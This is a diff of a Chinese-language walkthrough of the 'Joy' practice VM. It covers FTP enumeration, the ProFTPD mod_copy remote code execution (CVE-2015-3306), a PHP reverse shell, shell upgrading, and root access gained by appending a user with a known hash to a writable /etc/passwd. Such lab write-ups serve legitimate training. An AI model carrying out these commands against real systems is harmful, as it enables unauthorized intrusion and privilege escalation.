@@ -97,20 +97,34 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 61.97 seconds
 
 ```
-> 这个靶机的端口开的也挺多, 一一简单的列举一下
-> 21: ftp
-> 22: ssh
-> 25: smtp
-> 80: http
-> 110: pop3
-> 139: samba
-> 143: imap
-> 445: samba
-> 465: smtp
-> 587: smtp
-> 993: ssl/imap
-> 995: ssl/pop3
-> 先从ftp入手， 因为他能够让我匿名登录
+这个靶机的端口开的也挺多, 一一简单的列举一下
+<br>
+21: ftp
+<br>
+22: ssh
+<br>
+25: smtp
+<br>
+80: http
+<br>
+110: pop3
+<br>
+139: samba
+<br>
+143: imap
+<br>
+445: samba
+<br>
+465: smtp
+<br>
+587: smtp
+<br>
+993: ssl/imap
+<br>
+995: ssl/pop3
+<br>
+先从ftp入手， 因为他能够让我匿名登录
+<br>
 ```
 ftp 192.168.146.62
 Connected to 192.168.146.62.
@@ -225,16 +239,17 @@ rhinoceros
 pondskater
 Lock down this machine!
 ```
-> 在目前以上的信息暂时没有用, 继续往下探索
+<br>在目前以上的信息暂时没有用, 继续往下探索
+<br>
 访问一下web界面看看
 
 ![Img](../FILES/Joy/img-20220714143305.png)
->有一个ossec目录, 点进去是一个事件管理平台
+<br>有一个ossec目录, 点进去是一个事件管理平台
 
 ![Img](../FILES/Joy/img-20220714143417.png)
 
-> 通过左上角的logo可以看到这是一个OSSEC的平台, 并且版本为0.8, 那我们searchsploit看看有没有什么可利用的漏洞
-> 诶, 有的
+<br> 通过左上角的logo可以看到这是一个OSSEC的平台, 并且版本为0.8, 那我们searchsploit看看有没有什么可利用的漏洞
+<br> 诶, 有的
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62]
 └─$ searchsploit ossec                     
@@ -248,7 +263,7 @@ OSSEC WUI 0.8 - Denial of Service             | php/dos/37728.py
 Shellcodes: No Results
                                                               
 ```
-> 那就直接使用试试, 还正好对上了版本号
+<br>那就直接使用试试, 还正好对上了版本号
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62/script]
 └─$ searchsploit -m php/dos/37728.py     
@@ -267,8 +282,8 @@ Copied to: /home/aacai/Desktop/192.168.146.62/script/37728.py
 Connection failed.
 
 ```
-> 好吧.. 没用, 更换思路
-我重新回想了一下, 刚刚ftp里面有一个directory目录, 赶回去看看
+<br>好吧.. 没用, 更换思路
+<br>我重新回想了一下, 刚刚ftp里面有一个directory目录, 赶回去看看
 ```
 └─$ ftp 192.168.146.62       
 Connected to 192.168.146.62.
@@ -377,8 +392,8 @@ Information of this Machine!
 Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 
 ```
->在这里我看到了一个叫version_control的文件
-尝试使用telnet拷贝到upload文件夹里面查看文件内容
+<br>在这里我看到了一个叫version_control的文件
+<br>尝试使用telnet拷贝到upload文件夹里面查看文件内容
 ```
 └─$ telnet 192.168.146.62 21                                                                                                        1 ⨯
 Trying 192.168.146.62...
@@ -397,7 +412,7 @@ exit
 221 Goodbye.
 Connection closed by foreign host.
 ```
->再去ftp里面下载下来
+<br>再去ftp里面下载下来
 ```
 └─$ ftp 192.168.146.62
 Connected to 192.168.146.62.
@@ -467,7 +482,7 @@ Note that we have some other configurations in this machine.
 2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
 
 ```
-> 在这里我们得到了几个版本信息, 并且web的主目录迁移到了/var/www/tryingharderisjoy, 可能这几个application里面带有漏洞, 使用searchexploit试试
+<br> 在这里我们得到了几个版本信息, 并且web的主目录迁移到了/var/www/tryingharderisjoy, 可能这几个application里面带有漏洞, 使用searchexploit试试
 ```
 └─$ searchsploit proftpd 1.3.5
 --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -484,7 +499,7 @@ Shellcodes: No Results
 
 ```
 ### 利用漏洞部分
-> 通过searchsploit查看到有远程代码执行的漏洞, 下载下来尝试使用
+<br>通过searchsploit查看到有远程代码执行的漏洞, 下载下来尝试使用
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62]
 └─$ python 36803.py 192.168.146.62 /var/www/tryingharderisjoy id
@@ -504,8 +519,8 @@ Shellcodes: No Results
 KeyboardInterrupt
 
 ```
->没反应, 去github上面看看
-原来ProFTPD是有一个CVEID的
+<br>没反应, 去github上面看看
+<br>原来ProFTPD是有一个CVEID的
 https://github.com/t0kx/exploit-CVE-2015-3306/
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62]
@@ -548,12 +563,12 @@ Dockerfile  exploit.py  LICENSE  main.sh  README.md
 
 ```
 *It's working!!!*
->接下来试试输入命令
+<br>接下来试试输入命令
 ![Img](./FILES/Joy/img-20220714150445.png)
->有回显
-试试nc
+<br>有回显
+<br>试试nc
 ![Img](./FILES/Joy/img-20220714150525.png)
-nc并没有回显, 那就只能用php了
+<br>nc并没有回显, 那就只能用php了
 
 >先在本地起个监听
 ```
@@ -593,9 +608,9 @@ $ ip a
 $ 
 
 ```
->拿到普通用户权限
+<br>拿到普通用户权限
 
-### 提权部分
+## 提权部分
 ```
 $ pwd
 /var/www/tryingharderisjoy
@@ -630,8 +645,9 @@ how would these hack3rs ever find such a page?
 $ 
 
 ```
-> 通过目录的枚举, 可以看到在这里面包含了一个patrick用户的密码
-由于我拿到的是一个简单的shell交互, 不能进行sh登录, 于是我去google了一下, 发现了一个新方法, 分享给大家
+<br>通过目录的枚举, 可以看到在这里面包含了一个patrick用户的密码
+
+>由于我拿到的是一个简单的shell交互, 不能进行sh登录, 于是我去google了一下, 发现了一个新方法, 分享给大家
 https://forum.hackthebox.com/t/su-must-be-run-from-a-terminal/1458/4
 只需要一条命令就可以变成功能较完整的shell界面
 ```
@@ -647,7 +663,7 @@ www-data@JOY:/var/www/tryingharderisjoy/ossec$
 同样的, python也同样可以实现
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
->切换到Patrick
+<br>切换到Patrick
 ```
 www-data@JOY:/var/www/tryingharderisjoy/ossec$ su patrick
 su patrick
@@ -678,7 +694,7 @@ ip a
 patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
 
 ```
-> 通过sudo -l我们可以知道当前用户是否拥有sudo的权限去执行某文件
+<br> 通过sudo -l我们可以知道当前用户是否拥有sudo的权限去执行某文件
 ```
 patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l 
 sudo -l
@@ -715,7 +731,7 @@ ls -al /etc/passwd
 -rwxrwxrwx 1 root root 2556 Jan 28  2019 /etc/passwd
 patrick@JOY:~$ 
 ```
-> 接下来生成一个新的密码, 新建一个用户
+<br>接下来生成一个新的密码, 新建一个用户
 ```
 patrick@JOY:~$ echo 'aaron:$1$somesalt$rWwI4VdCMoDDJK593phlI.:0:0::/root/bin/bash' >> /etc/passwd
 h' >> /etc/passwdmesalt$rWwI4VdCMoDDJK593phlI.:0:0::/root/bin/bash
